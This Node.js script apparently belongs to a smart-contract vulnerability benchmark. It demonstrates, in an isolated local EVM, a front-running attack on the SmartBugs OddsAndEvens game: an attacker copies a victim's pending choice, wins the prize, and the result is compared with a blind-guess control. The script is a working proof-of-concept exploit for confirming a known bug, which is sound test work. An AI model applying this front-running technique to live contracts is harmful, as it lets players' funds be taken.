'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

function digest(bytes) { return crypto.createHash('sha256').update(bytes).digest('hex'); }

function compile(sourceName, source) {
  const input = { language: 'Solidity', sources: {
    [sourceName]: { content: source },
  }, settings: { optimizer: { enabled: false }, outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } } };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  return output.contracts;
}

function artifact(contracts, sourceName, contractName) {
  const item = contracts?.[sourceName]?.[contractName];
  if (!item?.abi || !item?.evm?.bytecode?.object) throw new Error(`artifact_missing:${sourceName}:${contractName}`);
  return item;
}

async function deploy(signer, item, args = [], overrides = {}) {
  const contract = await new ContractFactory(item.abi, item.evm.bytecode.object, signer).deploy(...args, overrides);
  const receipt = await contract.deploymentTransaction().wait();
  if (receipt.status !== 1) throw new Error('deployment_failed');
  await contract.waitForDeployment();
  return { contract, receipt };
}

async function nativeBalance(provider, address) {
  return BigInt(await provider.send('eth_getBalance', [address, 'latest']));
}

async function playScenario(provider, owner, attacker, victim, gameArtifact, attackerNumber) {
  const wager = 1000000000000000000n;
  const prize = 1800000000000000000n;
  const gameDeployment = await deploy(owner, gameArtifact);
  const game = gameDeployment.contract;
  const attackerAddress = (await attacker.getAddress()).toLowerCase();
  const victimAddress = (await victim.getAddress()).toLowerCase();
  const gameAddress = await game.getAddress();
  const attackerBalanceBefore = await nativeBalance(provider, attackerAddress);
  const victimBalanceBefore = await nativeBalance(provider, victimAddress);
  const attackReceipt = await (await game.connect(attacker).getFunction('play')(attackerNumber, {
    value: wager, gasLimit: 500000,
  })).wait();
  const victimReceipt = await (await game.connect(victim).getFunction('play')(0, {
    value: wager, gasLimit: 500000,
  })).wait();
  const attackerGasCost = BigInt(attackReceipt.gasUsed) * BigInt(attackReceipt.gasPrice);
  const victimGasCost = BigInt(victimReceipt.gasUsed) * BigInt(victimReceipt.gasPrice);
  const attackerReceived = (await nativeBalance(provider, attackerAddress)) - attackerBalanceBefore + wager + attackerGasCost;
  const victimReceived = (await nativeBalance(provider, victimAddress)) - victimBalanceBefore + wager + victimGasCost;
  const remainingPlayers = await Promise.all([game.getFunction('players')(0), game.getFunction('players')(1)]);
  const emptyAfterRound = remainingPlayers.every((player) => player.addr.toLowerCase() === '0x0000000000000000000000000000000000000000');
  const gameBalance = BigInt(await game.runner.provider.getBalance(gameAddress));
  return {
    attackerNumber, victimNumber: 0,
    attackerAddress, victimAddress,
    attackerReceivedWei: attackerReceived.toString(), victimReceivedWei: victimReceived.toString(),
    attackerPlayBlock: Number(attackReceipt.blockNumber), victimPlayBlock: Number(victimReceipt.blockNumber),
    gameBalanceWei: gameBalance.toString(), emptyAfterRound,
    transactionsSucceeded: attackReceipt.status === 1 && victimReceipt.status === 1,
    transactions: [gameDeployment.receipt, attackReceipt, victimReceipt].map((receipt, index) => ({
      name: ['deploy_game', 'attacker_play', 'victim_play'][index], status: receipt.status, hash: receipt.hash,
    })),
    expectedPrizeWei: prize.toString(), expectedGameRemainderWei: (2n * wager - prize).toString(),
  };
}

(async () => {
  const sourcePath = path.resolve(process.argv[2] || '');
  const sourceBytes = fs.readFileSync(sourcePath);
  const source = sourceBytes.toString('utf8');
  const sourceSha256 = digest(sourceBytes);
  const expectedSha256 = process.env.TRAINING_SOURCE_SHA256 || '';
  if (!/^[a-f0-9]{64}$/.test(expectedSha256) || sourceSha256 !== expectedSha256) {
    throw new Error('training_odds_source_hash_mismatch');
  }
  if (String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0] !== '0.4.26'
      || !String(solc.version()).startsWith('0.4.26+')) {
    throw new Error('training_odds_requires_exact_solc_0.4.26');
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '').replace(/^0x/, '');
  if (!/^[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('training_odds_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('training_odds_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('training_odds_evm_not_isolated');
  }

  const sourceName = path.basename(sourcePath);
  const contracts = compile(sourceName, source);
  const gameArtifact = artifact(contracts, sourceName, 'OddsAndEvens');
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('training_odds_chain_id_mismatch');
  const owner = await provider.getSigner(0);
  const attacker = await provider.getSigner(1);
  const victim = await provider.getSigner(2);

  // Victim's pending choice is observable as number 0. In the front-run sequence,
  // attacker copies that choice and gets player slot 0 before the victim's transaction.
  const frontRun = await playScenario(provider, owner, attacker, victim, gameArtifact, 0);
  // Control keeps the same transaction order and wager, but the attacker lacks the
  // victim's pending choice and guesses 1; the victim wins the deterministic round.
  const blindControl = await playScenario(provider, owner, attacker, victim, gameArtifact, 1);
  const confirmed = frontRun.transactionsSucceeded && blindControl.transactionsSucceeded
    && frontRun.attackerPlayBlock < frontRun.victimPlayBlock
    && frontRun.attackerReceivedWei === frontRun.expectedPrizeWei
    && frontRun.victimReceivedWei === '0'
    && blindControl.attackerReceivedWei === '0'
    && blindControl.victimReceivedWei === blindControl.expectedPrizeWei
    && frontRun.gameBalanceWei === frontRun.expectedGameRemainderWei
    && blindControl.gameBalanceWei === blindControl.expectedGameRemainderWei
    && frontRun.emptyAfterRound && blindControl.emptyAfterRound;
  const assertions = [
    { name: 'copied_pending_choice_is_mined_first_and_attacker_wins',
      passed: frontRun.attackerPlayBlock < frontRun.victimPlayBlock
        && frontRun.attackerReceivedWei === frontRun.expectedPrizeWei && frontRun.victimReceivedWei === '0' },
    { name: 'same_order_blind_choice_control_pays_victim',
      passed: blindControl.attackerReceivedWei === '0' && blindControl.victimReceivedWei === blindControl.expectedPrizeWei },
    { name: 'round_settles_and_clears_players_with_expected_assets',
      passed: frontRun.gameBalanceWei === frontRun.expectedGameRemainderWei
        && blindControl.gameBalanceWei === blindControl.expectedGameRemainderWei
        && frontRun.emptyAfterRound && blindControl.emptyAfterRound },
  ];
  const result = {
    schemaVersion: 1, sampleId: 'smartbugs-odds-and-evens',
    state: confirmed ? 'confirmed' : 'unconfirmed', confirmedVulnerability: confirmed,
    vulnerability: 'transaction_ordering_front_run_game_choice',
    proofScope: 'In an isolated local EVM, the victim submits play(0). An attacker copying that pending choice and getting player slot 0 first wins the 1.8 ETH prize; with the same order and wager but a blind play(1) guess, the victim wins. Recipient native balances are measured through local JSON-RPC and normalized for transaction gas. This models a public pending choice and controlled ordering, not a public mempool or live market.',
    mode: 'isolated_in_process', compilerVersion: solc.version(), compilerArtifactSha256,
    compilerKind: 'solc-js-original-source', sourceSha256,
    wagerWei: '1000000000000000000', prizeWei: '1800000000000000000',
    frontRun, blindControl, attackerAssetGainComparedToBlind: (BigInt(frontRun.attackerReceivedWei) - BigInt(blindControl.attackerReceivedWei)).toString(),
    transactions: [...frontRun.transactions, ...blindControl.transactions], assertions,
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : 'front_run_payout_or_blind_control_assertion_failed',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 2;
});
